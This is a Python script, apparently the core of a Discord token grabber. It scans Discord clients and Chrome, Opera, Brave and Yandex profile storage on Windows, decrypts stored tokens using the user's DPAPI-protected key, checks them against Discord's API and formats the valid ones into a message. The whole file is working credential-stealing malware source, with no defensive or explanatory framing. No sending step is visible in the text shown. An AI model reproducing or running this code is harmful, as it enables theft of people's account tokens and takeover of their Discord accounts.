import os
import json
import base64
import re
import requests
from pathlib import Path
from win32crypt import CryptUnprotectData
from Crypto.Cipher import AES

def validate_token(token):
    r = requests.get("https://discord.com/api/v9/users/@me", headers={
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
        'Content-Type': 'application/json',
        'Authorization': token})
    return r.status_code

def find_tokens_in_file(file_path, regexs):
    found_tokens = []
    with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
        lines = [x.strip() for x in f.readlines() if x.strip()]
        for line in lines:
            for r in regexs:
                for token in re.findall(r,line):
                    found_tokens.append(token)

    return found_tokens

def decrypt_val(buff, master_key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass
    except Exception:
        return "Failed to decrypt password"

def find_discord(p):
    totals_tokens = []
    tail = p
    p += "\\Local Storage\\leveldb"
    
    try:
        for file_name in os.listdir(p):
            file_path = os.path.join(p, file_name)
            if (file_name.endswith(".log") or file_name.endswith(".ldb")):
                pattern = re.compile(r'dQw4w9WgXcQ:([^.*\[\(.*)\].*$][^\"]*)', re.MULTILINE)
                found_tokens = find_tokens_in_file(file_path, [pattern])
                for tkn in found_tokens:
                    enc = json.loads(Path(os.path.join(tail, "Local State")).read_text())["os_crypt"]["encrypted_key"]
                    enc = base64.b64decode(enc)[5:]
                    enc = CryptUnprotectData(enc, None, None, None, 0)[1]
                    out = decrypt_val(base64.b64decode(tkn.split('dQw4w9WgXcQ:')[0]), enc)
                    if out not in totals_tokens:
                        totals_tokens.append(out)

    except Exception as e:
        pass
    return totals_tokens

def find_platform(p):
    totals_tokens = []
    p += "\\Local Storage\\leveldb"

    try:
        for file_name in os.listdir(p):
            file_path = os.path.join(p, file_name)

            if (file_name.endswith(".log") or file_name.endswith(".ldb")):
                regexs = [
                    re.compile(r"mfa\.[\w-]{84}"),
                    re.compile(r"[\w-][\w-][\w-]{24}\.[\w-]{6}\.[\w-]{26,110}"),
                    re.compile(r"[\w-]{24}\.[\w-]{6}\.[\w-]{38}"),
                ]
                found_tokens = find_tokens_in_file(file_path, regexs)

                for tkn in found_tokens:
                    if tkn not in totals_tokens:
                        totals_tokens.append(tkn)

    except Exception as e:
        pass

    return totals_tokens

def get_tokens():
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')

    message = ""

    platforms = {
        'Discord': roaming + '\\discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Discord PTB': roaming + '\\discordptb',
        'Discord Development': roaming + '\\discorddevelopment',
        'Lightcord': roaming + '\\lightcord',
        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
    }

    for platform, path in platforms.items():
        if os.path.exists(path):
            message += f'\n**{platform}**\n```\n'
            if "cord" in path:
                tokens = find_discord(path)
                if not len(tokens) > 0:
                    tokens = find_platform(path)
            else:
                tokens = find_platform(path)

            if len(tokens) > 0:
                for token in tokens:
                    if validate_token(token) == 200:
                        message += f'{token}\n'
            else:
                message += 'No tokens found.\n'

            message += '```'

    return message